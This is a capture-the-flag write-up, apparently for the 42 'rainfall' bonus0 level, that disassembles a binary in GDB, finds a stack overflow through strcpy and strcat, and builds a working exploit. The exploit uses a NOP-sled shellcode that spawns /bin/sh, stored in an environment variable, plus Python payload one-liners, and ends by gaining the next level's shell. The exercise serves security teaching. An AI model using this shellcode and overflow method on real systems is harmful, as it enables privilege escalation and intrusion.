# Bonus0

First step - testing the program

	$ ./bonus0
	 -
	coucou
	 -
	coucou
	coucou coucou
	$ ./bonus0
	 -
	a
	 -
	b
	a b


The program wait an input 2 times and print the result

Start in GDB

	(gdb-peda)$ pdisas main
	Dump of assembler code for function main:
	   0x080485a4 <+0>:		push   ebp
	   0x080485a5 <+1>:		mov    ebp,esp
	   0x080485a7 <+3>:		and    esp,0xfffffff0
	   0x080485aa <+6>:		sub    esp,0x40
	   0x080485ad <+9>:		lea    eax,[esp+0x16]
	   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
	   0x080485b4 <+16>:	call   0x804851e <pp>
	   0x080485b9 <+21>:	lea    eax,[esp+0x16]
	   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
	   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
	   0x080485c5 <+33>:	mov    eax,0x0
	   0x080485ca <+38>:	leave
	   0x080485cb <+39>:	ret
	End of assembler dump.

The main call a function "pp"

	(gdb-peda)$ pdisas pp
	Dump of assembler code for function pp:
	   0x0804851e <+0>:		push   ebp
	   0x0804851f <+1>:		mov    ebp,esp
	   0x08048521 <+3>:		push   edi
	   0x08048522 <+4>:		push   ebx
	   0x08048523 <+5>:		sub    esp,0x50
	   0x08048526 <+8>:		mov    DWORD PTR [esp+0x4],0x80486a0
	   0x0804852e <+16>:	lea    eax,[ebp-0x30]
	   0x08048531 <+19>:	mov    DWORD PTR [esp],eax
	   0x08048534 <+22>:	call   0x80484b4 <p>
	   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
	   0x08048541 <+35>:	lea    eax,[ebp-0x1c]
	   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
	   0x08048547 <+41>:	call   0x80484b4 <p>
	   0x0804854c <+46>:	lea    eax,[ebp-0x30]
	   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
	   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
	   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
	   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
	   0x0804855e <+64>:	mov    ebx,0x80486a4
	   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
	   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
	   0x0804856d <+79>:	mov    edx,eax
	   0x0804856f <+81>:	mov    eax,0x0
	   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
	   0x08048577 <+89>:	mov    edi,edx
	   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
	   0x0804857b <+93>:	mov    eax,ecx
	   0x0804857d <+95>:	not    eax
	   0x0804857f <+97>:	sub    eax,0x1
	   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
	   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
	   0x08048588 <+106>:	mov    WORD PTR [eax],dx
	   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
	   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
	   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
	   0x08048595 <+119>:	mov    DWORD PTR [esp],eax
	   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
	   0x0804859d <+127>:	add    esp,0x50
	   0x080485a0 <+130>:	pop    ebx
	   0x080485a1 <+131>:	pop    edi
	   0x080485a2 <+132>:	pop    ebp
	   0x080485a3 <+133>:	ret
	End of assembler dump.

The function "pp" call a function "p". And strcpy, we can overflow

	(gdb-peda)$ pdisas p
	Dump of assembler code for function p:
	   0x080484b4 <+0>:		push   ebp
	   0x080484b5 <+1>:		mov    ebp,esp
	   0x080484b7 <+3>:		sub    esp,0x1018
	   0x080484bd <+9>:		mov    eax,DWORD PTR [ebp+0xc]
	   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
	   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
	   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
	   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
	   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
	   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
	   0x080484e1 <+45>:	call   0x8048380 <read@plt>
	   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
	   0x080484ee <+58>:	lea    eax,[ebp-0x1008]
	   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
	   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
	   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
	   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
	   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
	   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
	   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
	   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
	   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
	   0x0804851c <+104>:	leave
	   0x0804851d <+105>:	ret
	End of assembler dump.

Search the overflow with the pattern tool

	(gdb-peda)$ pattern create 200
	'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

	(gdb-peda)$ r
	Starting program: /home/nico/42/rainfall/bonus0/Ressources/bonus0
	 -
	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
	 -
	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
	AAA%AAsAABAA$AAnAACAAAA%AAsAABAA$AAnAACA AAA%AAsAABAA$AAnAACA

	Program received signal SIGSEGV, Segmentation fault.
	....

	(gdb-peda)$ pattern search
	Registers contain pattern buffer:
	EBP+0 found at offset: 9
	EIP+0 found at offset: 13
	No register points to pattern buffer
	Pattern buffer found at:
	0x0804a1b4 : offset    0 - size   20 ([heap])
	0x0804a1c9 : offset    0 - size   20 ([heap])
	0xffffc280 : offset    0 - size  200 ($sp + -0x10c0 [-1072 dwords])
	0xffffd2bc : offset    4 - size    8 ($sp + -0x84 [-33 dwords])
	0xffffd2d0 : offset    4 - size   12 ($sp + -0x70 [-28 dwords])
	0xffffd31a : offset    0 - size   20 ($sp + -0x26 [-10 dwords])
	0xffffd32f : offset    0 - size   20 ($sp + -0x11 [-5 dwords])
	References to pattern buffer found at:
	0xffffc248 : 0xffffc280 ($sp + -0x10f8 [-1086 dwords])
	0xffffc274 : 0xffffc280 ($sp + -0x10cc [-1075 dwords])

We have the offset of the overflow. 13 for overwrite EIP, too small for inject a shellcode

Let's try with the 2 buffers

	(gdb-peda)$ r
	Starting program: /home/nico/42/rainfall/bonus0/Ressources/bonus0
	 -
	BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
	 -
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	BBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAA

	Program received signal SIGSEGV, Segmentation fault.
	[----------------------------------registers-----------------------------------]
	EAX: 0x0
	EBX: 0x0
	ECX: 0xf7fac010 --> 0x0
	EDX: 0x3e ('>')
	ESI: 0xf7faa000 --> 0x1d6d6c
	EDI: 0xf7faa000 --> 0x1d6d6c
	EBP: 0x41414141 ('AAAA')
	ESP: 0xffffd340 --> 0x414141 ('AAA')
	EIP: 0x41414141 ('AAAA')

The program take 20 char on the first buffer and add the second (2 times?), and segfault

The overflow is on the second buffer

We need to use an env variable for the shellcode because the buffer is too small

	export payload=$(python -c 'print "\x90"*400+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')

Get the address of the nopsled in the env

	(gdb-peda)$ x/400xg ((char **)environ)

"0xffffde1a" for example

For build our payload in one line, the two inputs need to be splited by a "\n", but we need to know the size of the read for put the "\n" in the last character

	0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000 <--- third arg
	0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
	0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax <--- second arg
	0x080484da <+38>:	mov    DWORD PTR [esp],0x0 <--- first arg
	0x080484e1 <+45>:	call   0x8048380 <read@plt> <--- read() call

The size of the read is "0x1000" = 4096

So, the start of our payload will be (B * 4095) + "\n" + (second input)

Now, search the exact position of EIP in our payload

	python -c 'print "B"*4095+"\n"+"A"*13+"aaaa"+"B"*30' > file

	(gdb-peda)$ r < file
	Starting program: /home/nico/42/rainfall/bonus0/Ressources/bonus0 < file
	 -
	 -
	BBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAaaaaBBB AAAAAAAAAAAAAaaaaBBB

	Program received signal SIGSEGV, Segmentation fault.
	....
	EBP: 0x41414141 ('AAAA')
	ESP: 0xffffd340 --> 0x424242 ('BBB')
	EIP: 0x61616161 ('aaaa')
	....

The offset is good, just replace "aaaa" by the address of the nopsled (0xffffde1a)

	python -c 'print "B"*4095+"\n"+"A"*13+"\x1a\xde\xff\xff"+"B"*30' > file

	(gdb-peda)$ r < file
	Starting program: /home/nico/42/rainfall/bonus0/Ressources/bonus0 < file
	 -
	 -
	BBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAA����BBB AAAAAAAAAAAAA����BBB
	process 117382 is executing new program: /usr/bin/dash
	[Inferior 1 (process 117382) exited normally]
	Warning: not running

Good, reproduce in the vm!

	$ export payload=$(python -c 'print "\x90"*400+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')

Get the nopsled address

	(gdb) b *main+28
	Breakpoint 1 at 0x80485c0

	(gdb) r
	Starting program: /home/user/bonus0/bonus0
	-
	a
	-
	a
	Breakpoint 1, 0x080485c0 in main ()

	(gdb) x/200xs (char **)environ
	0xbffffc7d:"payload=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
	....

	(gdb) x/200xg 0xbffffc7d


We can take "0xbffffcbd"

Build the payload and exploit

	$ python -c 'print "B"*4095+"\n"+"A"*13+"\xbd\xfc\xff\xbf"+"B"*30' > /tmp/payload

	$ cat /tmp/payload - | ./bonus0
	 -
	 -
	BBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAA����BBB��� AAAAAAAAAAAAA����BBB���
	whoami
	Segmentation fault (core dumped)

Does not work on the vm with the 13 offset (why? gdb?), try with the other 9

	$ python -c 'print "B"*4095+"\n"+"A"*9+"\xbd\xfc\xff\xbf"+"B"*30' > /tmp/payload

	$ cat /tmp/payload - | ./bonus0
	 -
	 -
	BBBBBBBBBBBBBBBBBBBBAAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
	whoami
	bonus1

Good
